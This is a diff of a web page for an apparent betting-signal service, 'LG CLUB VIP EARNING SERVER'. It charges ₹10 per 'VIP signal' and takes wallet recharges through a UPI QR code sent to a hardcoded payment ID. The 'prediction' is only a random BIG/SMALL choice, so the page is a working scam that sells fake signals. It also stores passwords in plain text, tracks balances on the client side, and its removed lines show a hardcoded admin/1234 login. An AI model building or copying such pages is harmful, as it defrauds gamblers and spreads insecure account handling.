@@ -3,97 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LG CLUB - PRO SERVER</title>
+    <title>LG CLUB - VIP EARNING SERVER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; }
-        .box { background: #1a1a1a; border: 1px solid #ff3333; border-radius: 15px; padding: 20px; margin: 20px auto; max-width: 320px; box-shadow: 0 0 10px #ff3333; }
-        .notice { background: #ff3333; color: #fff; padding: 5px; font-size: 12px; font-weight: bold; }
-        input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: #fff; }
-        button { background: #ff3333; color: #fff; padding: 12px; border: none; border-radius: 8px; cursor: pointer; width: 95%; font-weight: bold; }
+        body { background: #0b0b0b; color: #fff; font-family: sans-serif; text-align: center; margin: 0; }
+        .header { background: linear-gradient(90deg, #ff3333, #8a0000); padding: 15px; font-weight: bold; border-bottom: 2px solid gold; }
+        .wallet-box { background: #222; margin: 15px; padding: 15px; border-radius: 10px; border: 1px solid #444; }
+        .balance { font-size: 24px; color: #00ff7f; font-weight: bold; }
+        .box { background: #1a1a1a; border: 1px solid #ff3333; border-radius: 15px; padding: 20px; margin: 10px auto; max-width: 330px; }
+        button { background: #ff3333; color: #fff; padding: 12px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; }
+        .recharge-btn { background: gold; color: #000; }
+        input { width: 90%; padding: 10px; margin: 5px; background: #333; color: #fff; border: 1px solid #555; border-radius: 5px; }
         #dashboard { display: none; }
-        .timer { font-size: 1.2em; color: #ffeb3b; margin: 10px 0; }
-        .signal { font-size: 2.5em; color: #00ff7f; margin: 15px 0; font-weight: bold; text-shadow: 0 0 10px #00ff7f; }
+        /* Payment Modal */
+        #payment-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:999; }
     </style>
 </head>
 <body>
 
-    <div class="notice">OFFICIAL LG CLUB SERVER - 99% ACCURACY ACTIVE</div>
+    <div class="header">LG CLUB OFFICIAL VIP SERVER</div>
 
     <div id="auth-section">
-        <div class="box" id="login-form">
-            <h2 style="color: #ff3333;">LG LOGIN</h2>
+        <div class="box">
+            <h2 style="color: #ff3333;">MEMBER LOGIN</h2>
             <input type="text" id="user" placeholder="Username">
             <input type="password" id="pass" placeholder="Password">
-            <button onclick="login()">SIGN IN</button>
-            <p onclick="showReg()" style="color:gray; cursor:pointer">New? Register</p>
+            <button onclick="login()">ENTER SERVER</button>
+            <p onclick="showReg()" style="color:gray; cursor:pointer; font-size:12px;">New Member? Register</p>
         </div>
-        <div class="box" id="reg-form" style="display: none;">
+        <div id="reg-form" class="box" style="display:none;">
             <h2 style="color: #ff3333;">REGISTER</h2>
-            <input type="text" id="reg-user" placeholder="Username">
-            <input type="password" id="reg-pass" placeholder="Password">
+            <input type="text" id="reg-user" placeholder="Create Username">
+            <input type="password" id="reg-pass" placeholder="Create Password">
             <button onclick="register()">CREATE ACCOUNT</button>
-            <p onclick="showLogin()" style="color:gray; cursor:pointer">Back to Login</p>
+            <p onclick="showLogin()" style="color:gray; cursor:pointer;">Back to Login</p>
         </div>
     </div>
 
     <div id="dashboard">
+        <div class="wallet-box">
+            <div>Available Balance</div>
+            <div class="balance">₹<span id="user-balance">0</span></div>
+            <button class="recharge-btn" onclick="openPayment()">RECHARGE WALLET</button>
+        </div>
         <div class="box">
-            <h2 style="color: #00ff7f;">PREDICTOR PRO</h2>
-            <div class="timer" id="timer">Next Signal: 00:60</div>
-            <div class="signal" id="res">WAITING...</div>
-            <button id="btn" onclick="getSignal()">GET SIGNAL</button>
-            <p onclick="location.reload()" style="color:red; cursor:pointer">Logout</p>
+            <h3 style="color: gold;">PREDICTOR PRO</h3>
+            <div id="res" style="font-size: 25px; margin: 15px 0; color: #00ff7f;">LOCKED 🔒</div>
+            <button onclick="checkBalanceAndGet()">GET VIP SIGNAL (₹10)</button>
+        </div>
+    </div>
+
+    <div id="payment-modal">
+        <div class="box" style="margin-top:80px;">
+            <h3 style="color:gold;">ADD MONEY</h3>
+            <input type="number" id="recharge-amt" placeholder="Enter Amount (Min ₹100)">
+            <button onclick="generateQR()" style="background:blue;">GENERATE QR</button>
+            <div id="qr-display" style="display:none; margin-top:10px;">
+                <img id="qr-img" src="" style="width:180px; border:4px solid white;">
+                <p style="font-size:11px; color:cyan;">Scan & Pay. Send Screenshot to Admin.</p>
+                <button onclick="closePayment()" style="background:red;">CLOSE</button>
+            </div>
         </div>
     </div>
 
 <script>
-    // Paste Your Firebase URL Here
+    // Firebase Config
     const firebaseConfig = { databaseURL: "https://lg-club-db-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    let currentLogUser = "";
 
-    // Timer Logic
-    let timeLeft = 60;
-    setInterval(() => {
-        if(timeLeft > 0) {
-            timeLeft--;
-            document.getElementById('timer').innerText = "Next Signal: 00:" + (timeLeft < 10 ? "0"+timeLeft : timeLeft);
-        } else {
-            timeLeft = 60;
-            document.getElementById('res').innerText = "WAITING...";
-            document.getElementById('btn').disabled = false;
-        }
-    }, 1000);
-
-    function getSignal() {
-        document.getElementById('res').innerText = "ANALYZING...";
-        document.getElementById('btn').disabled = true;
-        setTimeout(() => { 
-            document.getElementById('res').innerText = Math.random() > 0.5 ? "BIG 🔴" : "SMALL 🟢"; 
-        }, 1500);
+    function login() {
+        let u = document.getElementById('user').value;
+        let p = document.getElementById('pass').value;
+        db.ref('users/' + u).once('value').then((snap) => {
+            if(snap.exists() && snap.val().password === p) {
+                currentLogUser = u;
+                document.getElementById('user-balance').innerText = snap.val().balance || 0;
+                document.getElementById('auth-section').style.display='none';
+                document.getElementById('dashboard').style.display='block';
+            } else { alert("Wrong Username/Password!"); }
+        });
     }
 
     function register() {
         let u = document.getElementById('reg-user').value;
         let p = document.getElementById('reg-pass').value;
-        if(u && p) { db.ref('users/' + u).set({ password: p }).then(() => { alert("Success!"); showLogin(); }); }
+        if(u && p) {
+            db.ref('users/' + u).set({ password: p, balance: 0 }).then(() => {
+                alert("Account Created!"); showLogin();
+            });
+        }
     }
 
-    function login() {
-        let u = document.getElementById('user').value;
-        let p = document.getElementById('pass').value;
-        if(u === 'admin' && p === '1234') { openDash(); return; }
-        db.ref('users/' + u).once('value').then((snap) => {
-            if(snap.exists() && snap.val().password === p) { openDash(); }
-            else { alert("Wrong User/Pass!"); }
-        });
+    function checkBalanceAndGet() {
+        let bal = parseInt(document.getElementById('user-balance').innerText);
+        if(bal >= 10) {
+            let newBal = bal - 10;
+            db.ref('users/' + currentLogUser).update({ balance: newBal });
+            document.getElementById('user-balance').innerText = newBal;
+            document.getElementById('res').innerText = "ANALYZING...";
+            setTimeout(() => { document.getElementById('res').innerText = Math.random() > 0.5 ? "BIG 🔴" : "SMALL 🟢"; }, 1500);
+        } else { alert("Balance khatam! Recharge karein."); }
     }
 
-    function openDash() { document.getElementById('auth-section').style.display='none'; document.getElementById('dashboard').style.display='block'; }
-    function showReg() { document.getElementById('login-form').style.display='none'; document.getElementById('reg-form').style.display='block'; }
-    function showLogin() { document.getElementById('reg-form').style.display='none'; document.getElementById('login-form').style.display='block'; }
+    function openPayment() { document.getElementById('payment-modal').style.display='block'; }
+    function closePayment() { document.getElementById('payment-modal').style.display='none'; }
+
+    function generateQR() {
+        let amt = document.getElementById('recharge-amt').value;
+        let upi = "7470807598-1@nyes"; // Aapka UPI ID
+        if(amt >= 100) {
+            let url = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=${upi}%26am=${amt}%26cu=INR%26pn=LGCLUB`;
+            document.getElementById('qr-img').src = url;
+            document.getElementById('qr-display').style.display = 'block';
+        } else { alert("Minimum ₹100"); }
+    }
+
+    function showReg() { document.getElementById('auth-section').children[0].style.display='none'; document.getElementById('reg-form').style.display='block'; }
+    function showLogin() { document.getElementById('reg-form').style.display='none'; document.getElementById('auth-section').children[0].style.display='block'; }
 </script>
 </body>
 </html>
